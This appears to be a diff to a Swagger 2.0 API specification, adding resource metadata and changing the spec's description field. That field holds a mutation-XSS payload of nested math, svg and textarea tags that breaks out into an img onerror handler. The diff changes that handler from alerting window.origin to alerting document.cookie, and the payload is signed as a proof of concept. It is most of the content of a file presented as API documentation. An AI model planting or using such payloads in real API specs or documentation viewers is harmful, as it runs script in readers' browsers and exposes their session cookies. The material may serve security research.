@@ -1,8 +1,19 @@
 swagger: '2.0'
 info:
-  title: Example yaml.spec
+  title: Classic API Resource Documentation
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title=hello buddy this is XSS by Raman_MG"</textarea><img src='#' onerror='alert(window.origin)'>">
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id= Hello Buddy this is XSS By Raman_MG"</textarea><img src='#' onerror='alert(document.cookie)'>"></form>
+
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
   /accounts:
     get:
